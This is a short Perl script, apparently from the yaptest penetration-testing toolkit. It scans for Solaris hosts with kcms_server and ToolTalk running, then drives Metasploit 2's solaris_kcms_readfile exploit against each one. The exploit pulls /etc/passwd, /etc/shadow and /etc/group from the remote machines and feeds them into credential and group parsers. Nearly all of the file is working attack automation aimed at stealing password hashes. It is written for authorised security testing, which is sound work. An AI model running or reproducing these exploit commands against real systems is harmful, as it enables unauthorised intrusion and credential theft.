#!/usr/bin/perl -w
use strict;
use POSIX;
use yaptest;
use File::Basename;

my $timeout = 10;
my $script_name = basename($0);
my $usage = "Usage: $script_name
Tries to grab files using the KCMS file read exploit in metasploit 2.

Runs against all hosts which rpcinfo reports has running kcms_server.
The exploit also requires tooltalk to be running.

NB: msfcli from Metasploit 2 is required to be in the path (MSF3 won't work).
";

my $y = yaptest->new();
$y->check_exploit_ok();
my $ms2_dir = $y->get_config('metasploit_2_dir');

if (defined($ms2_dir)) {
	$ms2_dir .= '/' unless substr($ms2_dir, -1, 1); # add trailing slash
	print "NOTE: Assuming 'msfcli' from Metasploit 2 is installed in $ms2_dir\n";
} else {
	print "WARNING: metasploit_2_dir config option not set.  Use yaptest-config.pl\n";
	print "         to set 'metasploit_2_dir' to the location of Metasploit v2\n";
	print "         Will search for msfcli in \$PATH - probably not what you want\n";
	$ms2_dir = "";
}
print "\n";

foreach my $file (qw(passwd shadow)) {
	$y->run_test(
		command => $ms2_dir . "msfcli solaris_kcms_readfile RHOST=::IP:: RFILE=/etc/$file E",
		filter => { port_info => 'rpcinfo_tcp like % 100221 %' },
		output_file => "kcms-fileread-$file-::IP::.out",
		inactivity_timeout => $timeout,
		parser => "yaptest-credentials.pl add --ip ::IP:: -f"
	);
}

$y->run_test(
	command => $ms2_dir . "msfcli solaris_kcms_readfile RHOST=::IP:: RFILE=/etc/group E",
	filter => { port_info => 'rpcinfo_tcp like % 100221 %' },
	output_file => "kcms-fileread-group-::IP::.out",
	inactivity_timeout => $timeout,
	parser => "yaptest-groups.pl add --group_ip ::IP:: -f"
);

